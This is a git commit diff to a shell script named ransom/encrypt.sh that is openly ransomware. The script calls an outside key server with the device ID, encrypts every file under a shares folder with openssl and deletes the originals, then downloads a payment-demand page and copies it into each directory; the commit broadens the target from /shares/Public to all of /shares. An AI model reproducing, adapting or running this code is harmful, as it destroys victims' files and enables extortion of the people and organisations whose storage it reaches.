b20646e5c0dcfca87b0242a09bf82682a2af5945
absane <jsibley1@gmail.com>
2017-05-31 16:27:56 -0400

    Update encrypt.sh

--- ransom/encrypt.sh
+++ ransom/encrypt.sh
@@ -6,11 +6,14 @@ keyServer="https://secure.www-ssl.co"
 # Payment demand splash screen
 splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"
 
+# Folder to encrypt
+targetFolder="/shares"
+
 #	Encrypt files
 . /tmp/dynamicconfig.ini
 KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
-find -L /shares/Public -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 
 #	Warn user their files are encrypted
 curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
-find -L /shares/ -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
+find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
